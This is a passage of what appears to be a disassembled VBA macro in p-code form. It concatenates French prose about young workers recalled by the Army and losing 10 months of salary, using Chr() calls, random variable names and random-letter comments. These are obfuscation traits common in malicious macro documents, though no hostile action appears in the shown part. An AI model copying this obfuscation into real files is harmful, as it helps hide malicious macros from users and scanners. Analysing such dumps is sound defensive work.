' 	LitStr 0x0004 "pire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	QuoteRem 0x0067 0x000E " vlbavoqopjjkh"
' Line #147:
' 	LineCont 0x0004 49 00 00 00
' 	Ld g5 
' 	LitStr 0x0007 "encore:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "accordé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "report"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "incorporation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	BoS 0x0000 
' 	Ld g5 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "2"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	QuoteRem 0x002C 0x000C " ygvwchcziih"
' Line #148:
' 	LineCont 0x0008 09 00 00 00 17 00 00 00
' 	LitStr 0x0006 "jeunes"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ayant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "obtenu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Travail,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Armée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	QuoteRem 0x0070 0x0006 " zpqmx"
' Line #149:
' 	LineCont 0x000C 02 00 00 00 19 00 00 00 22 00 00 00
' 	Ld e1 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "intention"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "rappeler"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "beau"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "milieu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	QuoteRem 0x0052 0x0008 " duaiivb"
' Line #150:
' 	LineCont 0x000C 04 00 00 00 2D 00 00 00 61 00 00 00
' 	Ld e1 
' 	LitStr 0x0004 "leur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "carrière"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "professionnelle."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "implications"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	Ld e1 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "catastrophiques:"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Vivre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "salaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	St m4 
' 	QuoteRem 0x0072 0x000C " jeoaizgyyjq"
' Line #151:
' 	LineCont 0x0004 1F 00 00 00
' 	Ld m4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "permet"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assurer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "engagements,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "dettes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St m4 
' 	QuoteRem 0x004B 0x0006 " pblom"
' Line #152:
' 	LineCont 0x0004 1F 00 00 00
' 	LitStr 0x0006 "impôts"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "déjà"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "difficiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assumer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	St b3 
' 	QuoteRem 0x004A 0x000F " wsgqwwujbgyfwg"
' Line #153:
' 	LineCont 0x0004 27 00 00 00
' 	Ld b3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "début"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "active"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "normal."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b3 
' 	QuoteRem 0x0012 0x0006 " ncbec"
' Line #154:
' 	LineCont 0x0004 2A 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "pratiquer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "activité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "professionnelle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d4 
' 	QuoteRem 0x003D 0x0009 " vbympltg"
' Line #155:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld d4 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "implique"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "également"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "perte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "expérience"
' 	Add 
' 	St d4 
' 	QuoteRem 0x008F 0x0010 " itucmbzlzfylidf"
' Line #156:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld d4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "utile,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "nécessité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "période"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d4 
' 	QuoteRem 0x006B 0x000F " kcuiqbekzlahkn"
' Line #157:
' 	LineCont 0x0004 0A 00 00 00
' 	LitStr 0x0002 "de"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "réadaptation,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "modification"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "projet"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "professionnel"
' 	Add 
' 	St f7 
' 	QuoteRem 0x0081 0x0009 " jfaogsik"
' Line #158:
' 	LineCont 0x000C 0A 00 00 00 2D 00 00 00 34 00 00 00
' 	Ld f7 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "inquantifiable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "colère"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "employeurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St f7 
' 	BoS 0x0000 
' 	Ld f7 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "se"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "traduira,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "intentionnellement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "non,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "par"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St f7 
' 	QuoteRem 0x00D0 0x0008 " scrcrdh"
' Line #159:
' 	LineCont 0x0008 22 00 00 00 37 00 00 00
' 	Ld f7 
' 	LitStr 0x000E "ralentissement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "évolution"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "carrière."
' 	Add 
' 	St f7 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "fait"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "soit"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "bonnement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "impossible"
' 	Add 
' 	St i3 
' 	QuoteRem 0x009B 0x0009 " rjkmgblf"
' Line #160:
' 	Ld i3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assurer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "loyer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "salaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i3 
' 	QuoteRem 0x00BC 0x000F " rzvrebdryxgnyp"
' Line #161:
' 	Ld i3 
' 	LitStr 0x0005 "cette"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "période,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i3 
' 	QuoteRem 0x0033 0x000C " twnosvkzluh"
' Line #162:
' 	LineCont 0x0014 0A 00 00 00 2B 00 00 00 46 00 00 00 52 00 00 00 87 00 00 00
' 	LitStr 0x0001 "l"
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "abandon"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "logement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "irrémédiable."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "prendra"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "alors"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	BoS 0x0000 
' 	Ld g2 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "charge"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "frais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "déménagement,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "garde-meuble"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	BoS 0x0000 
' 	Ld g2 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "recherche"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "nouvel"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "appartement?"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	QuoteRem 0x0084 0x0005 " lyiy"
' Line #163:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "morale"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	QuoteRem 0x00AC 0x0007 " oapvmb"
' Line #164:
' 	LineCont 0x0018 9A 00 00 00 A1 00 00 00 A7 00 00 00 D3 00 00 00 DB 00 00 00 E0 00 00 00
' 	Ld e5 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "bas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "durant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "longs"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	Ld e5 
' 	LitStr 0x0002 "Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "rêve"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "était"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "entrain"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	Ld e5 
' 	LitStr 0x0005 "bâtir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "effondre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "laisser"
' 	Add 
